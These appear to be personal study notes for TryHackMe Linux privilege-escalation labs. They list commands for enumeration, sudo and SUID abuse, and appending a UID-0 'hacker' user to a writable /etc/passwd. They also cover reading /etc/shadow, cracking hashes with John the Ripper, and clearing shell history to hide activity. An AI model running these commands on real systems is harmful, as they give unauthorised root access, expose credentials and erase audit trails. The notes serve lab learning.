# TryHackMe - Linux Privilege Escalation Notes

## Enumeration

### **Basic Information Gathering**

```bash
whoami          # Check current user
id              # Show user ID and group info
hostname        # Display system hostname
uname -a       # Show system information
cat /etc/os-release  # Get OS details

```

### **Checking for SUID Binaries**

```bash
find / -perm -4000 2>/dev/null  # Find all SUID binaries

```

### **Checking for Writable Files**

```bash
find / -writable -type d 2>/dev/null  # Find writable directories
find / -writable -type f 2>/dev/null  # Find writable files

```

### **Checking for Cron Jobs**

```bash
cat /etc/crontab
ls -la /etc/cron*  # List cron jobs

```

## Privilege Escalation Techniques

### **1. Exploiting SUDO Permissions**

Check sudo permissions:

```bash
sudo -l

```

Example exploit:

```bash
sudo su  # If user has ALL privileges

```

### **2. Exploiting SUID Binaries**

Find exploitable SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null

```

Example (using `bash` SUID binary):

```bash
/usr/bin/bash -p

```

### **3. Writable /etc/passwd**

If `/etc/passwd` is writable, add a new user:

```bash
openssl passwd -1 -salt salt password  # Generate password hash
echo 'hacker:$1$salt$hashedpassword:0:0:hacker:/root:/bin/bash' >> /etc/passwd
su hacker

```

### **4. Exploiting Weak File Permissions**

Check writable `/etc/shadow`:

```bash
cat /etc/shadow

```

Crack hashes using John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

```

### **5. Kernel Exploits**

Check kernel version:

```bash
uname -r

```

Find exploits:

```bash
searchsploit linux kernel

```

## Post-Exploitation

### **1. Getting a Stable Shell**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

```

### **2. Clearing Logs**

```bash
cat /dev/null > ~/.bash_history
history -c && exit

```

## Useful Resources

- [GTFOBins](https://gtfobins.github.io/)
- [Linux Privilege Escalation Cheatsheet](https://www.hackingarticles.in/linux-privilege-escalation/)

---

These notes provide a quick reference for Linux privilege escalation techniques on TryHackMe. Always ensure you have permission before testing these techniques!

[Windows RDP Cheat Sheet](https://www.notion.so/Windows-RDP-Cheat-Sheet-1cb0aef854a28058b7b9f7fbe8441cf7?pvs=21)

[Linux RDP Cheat Sheet](https://www.notion.so/Linux-RDP-Cheat-Sheet-1cb0aef854a280809762d14d0165cdc0?pvs=21)

[Windows Privilege Escalation Cheat Sheet](https://www.notion.so/Windows-Privilege-Escalation-Cheat-Sheet-1e50aef854a280409742fd88f959e100?pvs=21)

[Linux Privilege Escalation Cheat Sheet](https://www.notion.so/Linux-Privilege-Escalation-Cheat-Sheet-1e50aef854a28029aa8aff7346680e30?pvs=21)

[🧠 **TryHackMe: HTTP in Detail — Summary**](https://www.notion.so/TryHackMe-HTTP-in-Detail-Summary-2a90aef854a280b38c9cc16e03d41d0f?pvs=21)

[**TryHackMe: DNS in Detail — Summary**](https://www.notion.so/TryHackMe-DNS-in-Detail-Summary-2a90aef854a28046b427dd357faf0712?pvs=21)